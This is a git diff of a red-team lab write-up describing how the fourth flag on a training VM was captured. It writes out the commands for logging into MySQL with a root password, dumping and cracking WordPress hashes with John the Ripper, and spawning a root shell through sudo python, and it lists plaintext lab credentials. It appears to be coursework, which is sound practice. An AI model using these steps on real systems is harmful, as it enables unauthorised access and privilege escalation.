@@ -85,13 +85,24 @@ The Red Team was able to penetrate `Target 1` and retrieve the following confide
 
   - `flag4`: flag4{715dea6c055b9fe3337544932f2941ce}
     - **Exploit Used**
-      - Logged into Steven after cracking the password hash from mysql
-	  - escalated to root using sudo python -c 'import pty; pty.spawn("/bin/sh")'
-      - find / -iname '*flag*' -type f
-	  
-	  
-	  
-steven:pink84
-michael:michael
-mysql
-	root:R@v3nSecurity
+      - We will be finding the password hash for the steven user account and cracking it than using the steven user permissions to create a root shell and find the last flag
+      - `ssh michael@192.168.1.110`
+      - `mysql -u root -pR@v3nSecurity`
+      - `select * from wp_users;`
+      - ![MySQL wp_users](Images/MySQL_wp_users.png "MySQL wp_users")
+      - Now we take the hashes that we found in the wp_users table and we put them into a text file to be cracked using John the Ripper
+      - `john MySQL_Hashes.txt --wordlist="/usr/share/wordlists/rockyou.txt"`
+      - `john --show MySQL_Hashes.txt`
+      - ![Steven's Password](Images/StevensPassword.png "Steven's Password")
+      - Now we login to the ssh account using Steven's account
+      - `ssh steven@192.168.1.110`
+      - We have to check the permissions of Steven's account
+      - `sudo -l`
+      - ![Steven's Permissions](Images/StevensPerms.png "Steven's Permissions")
+      - We now know that Steven can use sudo permissions for python so now we can exploit this by spawning a root bash shell
+      - `sudo python -c 'import pty; pty.spawn("/bin/bash")'`
+      - Now we run another seach for a flag file now that we have root permissions
+      - `find / -iname '*flag*' -type f`
+      - ![Flag 4 Location](Images/flag4Location.png "Flag 4 Location")
+      - `cat /root/flag4.txt`
+      - ![Flag 4](Images/flag4.png "Flag 4")
